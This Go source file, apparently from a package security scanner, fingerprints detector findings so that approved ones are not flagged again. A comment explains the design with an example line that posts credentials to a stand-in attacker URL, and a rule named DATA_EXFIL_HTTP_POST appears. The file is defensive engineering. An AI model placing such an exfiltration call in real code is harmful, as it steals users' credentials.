package delta

import (
	"crypto/sha256"
	"encoding/hex"
	"strconv"
	"strings"
)

// Finding is one security observation about a package, from either the
// detector or the in-process invisible-character scan.
type Finding struct {
	RuleID   string `json:"rule_id"`
	Severity string `json:"severity"`
	Analyzer string `json:"analyzer"`
	File     string `json:"file"`

	// Line is a pointer because the detector reports null for findings
	// that are not line-scoped. A plain int would serialise 0, which
	// reads as line zero and makes every baseline diff noisy.
	Line *int `json:"line"`

	// Lines and Count carry the invisible-character scan's per-file
	// tally: which lines held the codepoint, and how many times in total.
	Lines []int `json:"lines,omitempty"`
	Count int   `json:"count,omitempty"`

	Title string `json:"title"`
	Why   string `json:"why"`

	// Snippet is the detector's copy of the source line(s) the finding
	// came from. It is a fingerprint input, and that is load-bearing:
	// the detector's description truncates at the first pattern match, so
	// two calls on ONE line -- an approved one and an appended
	// exfiltration -- share a description and would otherwise share a
	// fingerprint, letting the second install under the first's approval.
	Snippet string `json:"snippet,omitempty"`

	// Occurrence disambiguates findings that are otherwise identical.
	Occurrence int `json:"occurrence"`
}

// fingerprint is the stable identity of a finding.
//
// Keyed on rule, normalised file, title, normalised and
// whitespace-collapsed evidence, and occurrence index.
//
// Line numbers are deliberately EXCLUDED: editing prose above a finding
// would otherwise resurface it as new and re-block an approved package.
// Severity and analyzer are excluded for the same reason -- a detector
// re-classification is not a new finding.
//
// Evidence is INCLUDED, and that inclusion is load-bearing. Keying on
// rule/file/title alone collided: detector titles are static, so a
// second DATA_EXFIL_HTTP_POST in an already-approved file -- one to a
// benign host, one to an attacker's webhook -- produced the same
// fingerprint and the malicious one was silently swallowed by its
// approved sibling.
//
// The description ALONE is not enough evidence, which is a divergence
// from the reference implementation and a deliberate one. For pattern
// rules the detector's description is "Pattern detected: <match>", and
// the match stops at the first keyword on the line. So
//
//	requests.post("https://analytics.example/collect", json=creds)
//
// and that same line with "; requests.post('https://attacker/steal',
// json=creds)" appended produce an IDENTICAL description -- and, in the
// reference implementation, an identical fingerprint. The exfiltration
// installs under the approved finding's identity. The snippet carries
// the whole source line, so including it separates them.
func fingerprint(f Finding, pkgAbs string) string {
	key := strings.Join([]string{
		f.RuleID,
		normalisePath(f.File, pkgAbs),
		f.Title,
		collapseSpace(normalisePath(f.Why, pkgAbs)),
		collapseSpace(normalisePath(f.Snippet, pkgAbs)),
		strconv.Itoa(f.Occurrence),
	}, "|")
	sum := sha256.Sum256([]byte(key))
	return hex.EncodeToString(sum[:])[:16]
}

// withOccurrences assigns each finding its occurrence index and rewrites
// File to the normalised path.
//
// Occurrence handles the residual case the evidence digest cannot: the
// same rule, file, title AND byte-identical evidence appearing twice.
// Without it the second copy would collapse onto the first, so adding a
// duplicate of an approved finding would be invisible.
//
// This is ORDER-SENSITIVE. Indices are assigned in input order, so
// callers must always pass detector findings first and invisible-scan
// findings second. Re-ordering or de-duplicating the input shifts the
// indices and invalidates every previously approved fingerprint.
func withOccurrences(findings []Finding, pkgAbs string) []Finding {
	seen := make(map[string]int, len(findings))
	out := make([]Finding, 0, len(findings))
	for _, f := range findings {
		normalised := normalisePath(f.File, pkgAbs)
		key := strings.Join([]string{
			f.RuleID,
			normalised,
			f.Title,
			collapseSpace(normalisePath(f.Why, pkgAbs)),
			collapseSpace(normalisePath(f.Snippet, pkgAbs)),
		}, "|")
		f.Occurrence = seen[key]
		seen[key]++
		if normalised != "" {
			f.File = normalised
		}
		out = append(out, f)
	}
	return out
}
